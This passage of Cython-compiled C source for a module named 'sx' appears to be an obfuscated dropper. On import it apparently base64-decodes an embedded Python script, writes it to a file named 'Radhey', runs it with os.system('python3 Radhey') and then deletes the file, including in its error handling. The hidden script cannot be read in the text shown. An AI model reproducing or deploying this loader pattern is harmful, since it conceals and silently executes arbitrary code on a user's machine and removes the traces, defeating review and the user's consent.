     __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;\n                  if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 9, __pyx_L15_error)\n                  __Pyx_GOTREF(__pyx_t_5);\n                }\n                __pyx_t_6 = 1;\n                {\n                  PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_t_5};\n                  __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n                  __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n                  __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n                  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n                  if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 9, __pyx_L15_error)\n                  __Pyx_GOTREF(__pyx_t_4);\n                }\n                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n\n                \n              }\n              __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n              __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n              __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n              goto __pyx_L20_try_end;\n              __pyx_L15_error:;\n              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;\n              __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n              __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n              __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n              __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n              __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n              __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n               {\n                __Pyx_AddTraceback("sx", __pyx_clineno, __pyx_lineno, __pyx_filename);\n                if (__Pyx_GetException(&__pyx_t_4, &__pyx_t_3, &__pyx_t_5) < 0) __PYX_ERR(0, 8, __pyx_L17_except_error)\n                __Pyx_XGOTREF(__pyx_t_4);\n                __Pyx_XGOTREF(__pyx_t_3);\n                __Pyx_XGOTREF(__pyx_t_5);\n                __pyx_t_2 = PyTuple_Pack(3, __pyx_t_4, __pyx_t_3, __pyx_t_5); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 8, __pyx_L17_except_error)\n                __Pyx_GOTREF(__pyx_t_2);\n                __pyx_t_16 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_t_2, NULL);\n                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n                __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n                if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 8, __pyx_L17_except_error)\n                __Pyx_GOTREF(__pyx_t_16);\n                __pyx_t_17 = __Pyx_PyObject_IsTrue(__pyx_t_16);\n                __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;\n                if (__pyx_t_17 < 0) __PYX_ERR(0, 8, __pyx_L17_except_error)\n                __pyx_t_18 = (!__pyx_t_17);\n                if (unlikely(__pyx_t_18)) {\n                  __Pyx_GIVEREF(__pyx_t_4);\n                  __Pyx_GIVEREF(__pyx_t_3);\n                  __Pyx_XGIVEREF(__pyx_t_5);\n                  __Pyx_ErrRestoreWithState(__pyx_t_4, __pyx_t_3, __pyx_t_5);\n                  __pyx_t_4 = 0;  __pyx_t_3 = 0;  __pyx_t_5 = 0; \n                  __PYX_ERR(0, 8, __pyx_L17_except_error)\n                }\n                __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n                __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n                __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n                goto __pyx_L16_exception_handled;\n              }\n              __pyx_L17_except_error:;\n              __Pyx_XGIVEREF(__pyx_t_10);\n              __Pyx_XGIVEREF(__pyx_t_11);\n              __Pyx_XGIVEREF(__pyx_t_12);\n              __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);\n              goto __pyx_L5_error;\n              __pyx_L16_exception_handled:;\n              __Pyx_XGIVEREF(__pyx_t_10);\n              __Pyx_XGIVEREF(__pyx_t_11);\n              __Pyx_XGIVEREF(__pyx_t_12);\n              __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_11, __pyx_t_12);\n              __pyx_L20_try_end:;\n            }\n          }\n           {\n            {\n              if (__pyx_t_9) {\n                __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_9, __pyx_mstate_global->__pyx_tuple[1], NULL);\n                __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n                if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 8, __pyx_L5_error)\n                __Pyx_GOTREF(__pyx_t_12);\n                __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;\n              }\n              goto __pyx_L14;\n            }\n            __pyx_L14:;\n          }\n          goto __pyx_L24;\n          __pyx_L11_error:;\n          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n          goto __pyx_L5_error;\n          __pyx_L24:;\n        }\n\n        \n        __pyx_t_3 = NULL;\n        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 10, __pyx_L5_error)\n        __Pyx_GOTREF(__pyx_t_4);\n        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 10, __pyx_L5_error)\n        __Pyx_GOTREF(__pyx_t_2);\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        __pyx_t_6 = 1;\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_mstate_global->__pyx_kp_u_python3_Radhey};\n          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 10, __pyx_L5_error)\n          __Pyx_GOTREF(__pyx_t_5);\n        }\n        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n        \n      }\n      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n      goto __pyx_L10_try_end;\n      __pyx_L5_error:;\n      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;\n      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n      __pyx_t_19 = __Pyx_PyErr_ExceptionMatches(((PyObject *)(((PyTypeObject*)PyExc_Exception))));\n      if (__pyx_t_19) {\n        __Pyx_AddTraceback("sx", __pyx_clineno, __pyx_lineno, __pyx_filename);\n        if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_2, &__pyx_t_3) < 0) __PYX_ERR(0, 11, __pyx_L7_except_error)\n        __Pyx_XGOTREF(__pyx_t_5);\n        __Pyx_XGOTREF(__pyx_t_2);\n        __Pyx_XGOTREF(__pyx_t_3);\n        if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_E, __pyx_t_2) < 0) __PYX_ERR(0, 11, __pyx_L7_except_error)\n         {\n\n          \n          __pyx_t_15 = NULL;\n          __Pyx_INCREF(__pyx_builtin_print);\n          __pyx_t_14 = __pyx_builtin_print; \n          __Pyx_GetModuleGlobalName(__pyx_t_13, __pyx_mstate_global->__pyx_n_u_E); if (unlikely(!__pyx_t_13)) __PYX_ERR(0, 12, __pyx_L30_error)\n          __Pyx_GOTREF(__pyx_t_13);\n          __pyx_t_6 = 1;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_15, __pyx_t_13};\n            __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_14, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n            __Pyx_DECREF(__pyx_t_13); __pyx_t_13 = 0;\n            __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;\n            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 12, __pyx_L30_error)\n            __Pyx_GOTREF(__pyx_t_4);\n          }\n          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        }\n\n        \n         {\n          {\n            if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_mstate_global->__pyx_n_u_E) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 11, __pyx_L7_except_error) }\n            goto __pyx_L31;\n          }\n          __pyx_L30_error:;\n          {\n            __Pyx_PyThreadState_declare\n            __Pyx_PyThreadState_assign\n            __pyx_t_9 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_10 = 0; __pyx_t_16 = 0; __pyx_t_22 = 0;\n            __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;\n            __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n            __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n             __Pyx_ExceptionSwap(&__pyx_t_10, &__pyx_t_16, &__pyx_t_22);\n            if ( unlikely(__Pyx_GetException(&__pyx_t_9, &__pyx_t_12, &__pyx_t_11) < 0)) __Pyx_ErrFetch(&__pyx_t_9, &__pyx_t_12, &__pyx_t_11);\n            __Pyx_XGOTREF(__pyx_t_9);\n            __Pyx_XGOTREF(__pyx_t_12);\n            __Pyx_XGOTREF(__pyx_t_11);\n            __Pyx_XGOTREF(__pyx_t_10);\n            __Pyx_XGOTREF(__pyx_t_16);\n            __Pyx_XGOTREF(__pyx_t_22);\n            __pyx_t_19 = __pyx_lineno; __pyx_t_20 = __pyx_clineno; __pyx_t_21 = __pyx_filename;\n            {\n              if (unlikely(__Pyx_PyObject_DelAttrStr(__pyx_m, __pyx_mstate_global->__pyx_n_u_E) < 0)) { if (likely(PyErr_ExceptionMatches(PyExc_AttributeError))) PyErr_Clear(); else __PYX_ERR(0, 11, __pyx_L35_error) }\n            }\n            __Pyx_XGIVEREF(__pyx_t_10);\n            __Pyx_XGIVEREF(__pyx_t_16);\n            __Pyx_XGIVEREF(__pyx_t_22);\n            __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_16, __pyx_t_22);\n            __Pyx_XGIVEREF(__pyx_t_9);\n            __Pyx_XGIVEREF(__pyx_t_12);\n            __Pyx_XGIVEREF(__pyx_t_11);\n            __Pyx_ErrRestore(__pyx_t_9, __pyx_t_12, __pyx_t_11);\n            __pyx_t_9 = 0; __pyx_t_12 = 0; __pyx_t_11 = 0; __pyx_t_10 = 0; __pyx_t_16 = 0; __pyx_t_22 = 0;\n            __pyx_lineno = __pyx_t_19; __pyx_clineno = __pyx_t_20; __pyx_filename = __pyx_t_21;\n            goto __pyx_L7_except_error;\n            __pyx_L35_error:;\n            __Pyx_XGIVEREF(__pyx_t_10);\n            __Pyx_XGIVEREF(__pyx_t_16);\n            __Pyx_XGIVEREF(__pyx_t_22);\n            __Pyx_ExceptionReset(__pyx_t_10, __pyx_t_16, __pyx_t_22);\n            __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n            __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;\n            __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n            __pyx_t_10 = 0; __pyx_t_16 = 0; __pyx_t_22 = 0;\n            goto __pyx_L7_except_error;\n          }\n          __pyx_L31:;\n        }\n        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n        goto __pyx_L6_exception_handled;\n      }\n      goto __pyx_L7_except_error;\n\n      \n      __pyx_L7_except_error:;\n      __Pyx_XGIVEREF(__pyx_t_1);\n      __Pyx_XGIVEREF(__pyx_t_7);\n      __Pyx_XGIVEREF(__pyx_t_8);\n      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n      goto __pyx_L3_error;\n      __pyx_L6_exception_handled:;\n      __Pyx_XGIVEREF(__pyx_t_1);\n      __Pyx_XGIVEREF(__pyx_t_7);\n      __Pyx_XGIVEREF(__pyx_t_8);\n      __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n      __pyx_L10_try_end:;\n    }\n  }\n\n  \n   {\n    {\n      __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 14, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_path); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 14, __pyx_L1_error)\n      __Pyx_GOTREF(__pyx_t_4);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_2 = __pyx_t_4;\n      __Pyx_INCREF(__pyx_t_2);\n      __pyx_t_6 = 0;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_mstate_global->__pyx_kp_u_Radhey};\n        __pyx_t_3 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_exists, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 14, __pyx_L1_error)\n        __Pyx_GOTREF(__pyx_t_3);\n      }\n      __pyx_t_18 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely((__pyx_t_18 < 0))) __PYX_ERR(0, 14, __pyx_L1_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      if (__pyx_t_18) {\n\n        \n        __pyx_t_4 = NULL;\n        __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 15, __pyx_L1_error)\n        __Pyx_GOTREF(__pyx_t_2);\n        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_remove); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L1_error)\n        __Pyx_GOTREF(__pyx_t_5);\n        __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n        __pyx_t_6 = 1;\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_4, __pyx_mstate_global->__pyx_kp_u_Radhey};\n          __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L1_error)\n          __Pyx_GOTREF(__pyx_t_3);\n        }\n        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n        \n      }\n      goto __pyx_L4;\n    }\n    __pyx_L3_error:;\n    {\n      __Pyx_PyThreadState_declare\n      __Pyx_PyThreadState_assign\n      __pyx_t_8 = 0; __pyx_t_7 = 0; __pyx_t_1 = 0; __pyx_t_22 = 0; __pyx_t_16 = 0; __pyx_t_10 = 0;\n      __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;\n      __Pyx_XDECREF(__pyx_t_14); __pyx_t_14 = 0;\n      __Pyx_XDECREF(__pyx_t_15); __pyx_t_15 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n       __Pyx_ExceptionSwap(&__pyx_t_22, &__pyx_t_16, &__pyx_t_10);\n      if ( unlikely(__Pyx_GetException(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1) < 0)) __Pyx_ErrFetch(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n      __Pyx_XGOTREF(__pyx_t_8);\n      __Pyx_XGOTREF(__pyx_t_7);\n      __Pyx_XGOTREF(__pyx_t_1);\n      __Pyx_XGOTREF(__pyx_t_22);\n      __Pyx_XGOTREF(__pyx_t_16);\n      __Pyx_XGOTREF(__pyx_t_10);\n      __pyx_t_20 = __pyx_lineno; __pyx_t_19 = __pyx_clineno; __pyx_t_23 = __pyx_filename;\n      {\n        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 14, __pyx_L38_error)\n        __Pyx_GOTREF(__pyx_t_4);\n        __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_path); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 14, __pyx_L38_error)\n        __Pyx_GOTREF(__pyx_t_2);\n        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n        __pyx_t_5 = __pyx_t_2;\n        __Pyx_INCREF(__pyx_t_5);\n        __pyx_t_6 = 0;\n        {\n          PyObject *__pyx_callargs[2] = {__pyx_t_5, __pyx_mstate_global->__pyx_kp_u_Radhey};\n          __pyx_t_3 = __Pyx_PyObject_FastCallMethod(__pyx_mstate_global->__pyx_n_u_exists, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (1*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n          __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n          if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 14, __pyx_L38_error)\n          __Pyx_GOTREF(__pyx_t_3);\n        }\n        __pyx_t_18 = __Pyx_PyObject_IsTrue(__pyx_t_3); if (unlikely((__pyx_t_18 < 0))) __PYX_ERR(0, 14, __pyx_L38_error)\n        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n        if (__pyx_t_18) {\n\n          \n          __pyx_t_2 = NULL;\n          __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 15, __pyx_L38_error)\n          __Pyx_GOTREF(__pyx_t_5);\n          __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_remove); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 15, __pyx_L38_error)\n          __Pyx_GOTREF(__pyx_t_4);\n          __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n          __pyx_t_6 = 1;\n          {\n            PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_mstate_global->__pyx_kp_u_Radhey};\n            __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 15, __pyx_L38_error)\n            __Pyx_GOTREF(__pyx_t_3);\n          }\n          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n          \n        }\n      }\n      __Pyx_XGIVEREF(__pyx_t_22);\n      __Pyx_XGIVEREF(__pyx_t_16);\n      __Pyx_XGIVEREF(__pyx_t_10);\n      __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_16, __pyx_t_10);\n      __Pyx_XGIVEREF(__pyx_t_8);\n      __Pyx_XGIVEREF(__pyx_t_7);\n      __Pyx_XGIVEREF(__pyx_t_1);\n      __Pyx_ErrRestore(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n      __pyx_t_8 = 0; __pyx_t_7 = 0; __pyx_t_1 = 0; __pyx_t_22 = 0; __pyx_t_16 = 0; __pyx_t_10 = 0;\n      __pyx_lineno = __pyx_t_20; __pyx_clineno = __pyx_t_19; __pyx_filename = __pyx_t_23;\n      goto __pyx_L1_error;\n      __pyx_L38_error:;\n      __Pyx_XGIVEREF(__pyx_t_22);\n      __Pyx_XGIVEREF(__pyx_t_16);\n      __Pyx_XGIVEREF(__pyx_t_10);\n      __Pyx_ExceptionReset(__pyx_t_22, __pyx_t_16, __pyx_t_10);\n      __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n      __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n      __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n      __pyx_t_22 = 0; __pyx_t_16 = 0; __pyx_t_10 = 0;\n      goto __pyx_L1_error;\n    }\n    __pyx_L4:;\n  }\n\n  \n  __pyx_t_3 = __Pyx_PyDict_NewPresized(0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 1, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_test, __pyx_t_3) < 0) __PYX_ERR(0, 1, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n\n  goto __pyx_L0;\n  __pyx_L1_error:;\n  __Pyx_XDECREF(__pyx_t_2);\n  __Pyx_XDECREF(__pyx_t_3);\n  __Pyx_XDECREF(__pyx_t_4);\n  __Pyx_XDECREF(__pyx_t_5);\n  __Pyx_XDECREF(__pyx_t_13);\n  __Pyx_XDECREF(__pyx_t_14);\n  __Pyx_XDECREF(__pyx_t_15);\n  if (__pyx_m) {\n    if (__pyx_mstate->__pyx_d && stringtab_initialized) {\n      __Pyx_AddTraceback("init sx", __pyx_clineno, __pyx_lineno, __pyx_filename);\n    }\n    #if !CYTHON_USE_MODULE_STATE\n    Py_CLEAR(__pyx_m);\n    #else\n    Py_DECREF(__pyx_m);\n    if (pystate_addmodule_run) {\n      PyObject *tp, *value, *tb;\n      PyErr_Fetch(&tp, &value, &tb);\n      PyState_RemoveModule(&__pyx_moduledef);\n      PyErr_Restore(tp, value, tb);\n    }\n    #endif\n  } else if (!PyErr_Occurred()) {\n    PyErr_SetString(PyExc_ImportError, "init sx");\n  }\n  __pyx_L0:;\n  __Pyx_RefNannyFinishContext();\n  #if CYTHON_PEP489_MULTI_PHASE_INIT\n  return (__pyx_m != NULL) ? 0 : -1;\n  #else\n  return __pyx_m;\n  #endif\n}\n\n\ntypedef struct {\n    const char *s;\n#if 763236 <= 65535\n    const unsigned short n;\n#elif 763236 / 2 < INT_MAX\n    const unsigned int n;\n#elif 763236 / 2 < LONG_MAX\n    const unsigned long n;\n#else\n    const Py_ssize_t n;\n#endif\n#if 1 <= 31\n    const unsigned int encoding : 5;\n#elif 1 <= 255\n    const unsigned char encoding;\n#elif 1 <= 65535\n    const unsigned short encoding;\n#else\n    const Py_ssize_t encoding;\n#endif\n    const unsigned int is_unicode : 1;\n    const unsigned int intern : 1;\n} __Pyx_StringTabEntry;\nstatic const char * const __pyx_string_tab_encodings[] = { 0 };\nstatic const __Pyx_StringTabEntry __pyx_string_tab[] = {\n  {__pyx_k_, sizeof(__pyx_k_), 0, 1, 0}, \n  {__pyx_k_D, sizeof(__pyx_k_D), 0, 1, 1}, \n  {__pyx_k_E, sizeof(__pyx_k_E), 0, 1, 1}, \n  {__pyx_k_Radhey, sizeof(__pyx_k_Radhey), 0, 1, 0}, \n  {__pyx_k_aW1wb3J0IG9zCmltcG9ydCB0aW1lCmlt, sizeof(__pyx_k_aW1wb3J0IG9zCmltcG9ydCB0aW1lCmlt), 0, 0, 0}, \n  {__pyx_k_b64decode, sizeof(__pyx_k_b64decode), 0, 1, 1}, \n  {__pyx_k_base64, sizeof(__pyx_k_base64), 0, 1, 1}, \n  {__pyx_k_clear, sizeof(__pyx_k_clear), 0, 1, 1}, \n  {__pyx_k_cline_in_traceback, sizeof(__pyx_k_cline_in_traceback), 0, 1, 1}, \n  {__pyx_k_enter, sizeof(__pyx_k_enter), 0, 1, 1}, \n  {__pyx_k_exists, sizeof(__pyx_k_exists), 0, 1, 1}, \n  {__pyx_k_exit, sizeof(__pyx_k_exit), 0, 1, 1}, \n  {__pyx_k_initializing, sizeof(__pyx_k_initializing), 0, 1, 1}, \n  {__pyx_k_main, sizeof(__pyx_k_main), 0, 1, 1}, \n  {__pyx_k_module, sizeof(__pyx_k_module), 0, 1, 1}, \n  {__pyx_k_name, sizeof(__pyx_k_name), 0, 1, 1}, \n  {__pyx_k_open, sizeof(__pyx_k_open), 0, 1, 1}, \n  {__pyx_k_os, sizeof(__pyx_k_os), 0, 1, 1}, \n  {__pyx_k_path, sizeof(__pyx_k_path), 0, 1, 1}, \n  {__pyx_k_print, sizeof(__pyx_k_print), 0, 1, 1}, \n  {__pyx_k_python3_Radhey, sizeof(__pyx_k_python3_Radhey), 0, 1, 0}, \n  {__pyx_k_qualname, sizeof(__pyx_k_qualname), 0, 1, 1}, \n  {__pyx_k_remove, sizeof(__pyx_k_remove), 0, 1, 1}, \n  {__pyx_k_spec, sizeof(__pyx_k_spec), 0, 1, 1}, \n  {__pyx_k_sunradhey, sizeof(__pyx_k_sunradhey), 0, 1, 1}, \n  {__pyx_k_system, sizeof(__pyx_k_system), 0, 1, 1}, \n  {__pyx_k_test, sizeof(__pyx_k_test), 0, 1, 1}, \n  {__pyx_k_wb, sizeof(__pyx_k_wb), 0, 1, 1}, \n  {__pyx_k_write, sizeof(__pyx_k_write), 0, 1, 1}, \n  {0, 0, 0, 0, 0}\n};\n\nstatic int __Pyx_InitStrings(__Pyx_StringTabEntry const *t, PyObject **target, const char* const* encoding_names);\n\n\n\nstatic int __Pyx_InitCachedBuiltins(__pyx_mstatetype *__pyx_mstate) {\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __pyx_builtin_open = __Pyx_GetBuiltinName(__pyx_mstate->__pyx_n_u_open); if (!__pyx_builtin_open) __PYX_ERR(0, 8, __pyx_L1_error)\n  __pyx_builtin_print = __Pyx_GetBuiltinName(__pyx_mstate->__pyx_n_u_print); if (!__pyx_builtin_print) __PYX_ERR(0, 12, __pyx_L1_error)\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\n\nstatic int __Pyx_InitCachedConstants(__pyx_mstatetype *__pyx_mstate) {\n  __Pyx_RefNannyDeclarations\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  __Pyx_RefNannySetupContext("__Pyx_InitCachedConstants", 0);\n\n  \n  __pyx_mstate_global->__pyx_tuple[0] = PyTuple_Pack(2, __pyx_mstate_global->__pyx_kp_u_Radhey, __pyx_mstate_global->__pyx_n_u_wb); if (unlikely(!__pyx_mstate_global->__pyx_tuple[0])) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_mstate_global->__pyx_tuple[0]);\n  __Pyx_GIVEREF(__pyx_mstate_global->__pyx_tuple[0]);\n  __pyx_mstate_global->__pyx_tuple[1] = PyTuple_Pack(3, Py_None, Py_None, Py_None); if (unlikely(!__pyx_mstate_global->__pyx_tuple[1])) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_mstate_global->__pyx_tuple[1]);\n  __Pyx_GIVEREF(__pyx_mstate_global->__pyx_tuple[1]);\n  __Pyx_RefNannyFinishContext();\n  return 0;\n  __pyx_L1_error:;\n  __Pyx_RefNannyFinishContext();\n  return -1;\n}\n\n\nstatic int __Pyx_InitConstants(__pyx_mstatetype *__pyx_mstate) {\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  if (__Pyx_InitStrings(__pyx_string_tab, __pyx_mstate->__pyx_string_tab, __pyx_string_tab_encodings) < 0) __PYX_ERR(0, 1, __pyx_L1_error);\n  return 0;\n  __pyx_L1_error:;\n  return -1;\n}\n\n\nstatic int __Pyx_CreateCodeObjects(__pyx_mstatetype *__pyx_mstate) {\n  CYTHON_UNUSED_VAR(__pyx_mstate);\n  return 0;\n}\n\n\nstatic int __Pyx_InitGlobals(void) {\n  \n  if (likely(__Pyx_init_co_variables() == 0)); else\n\nif 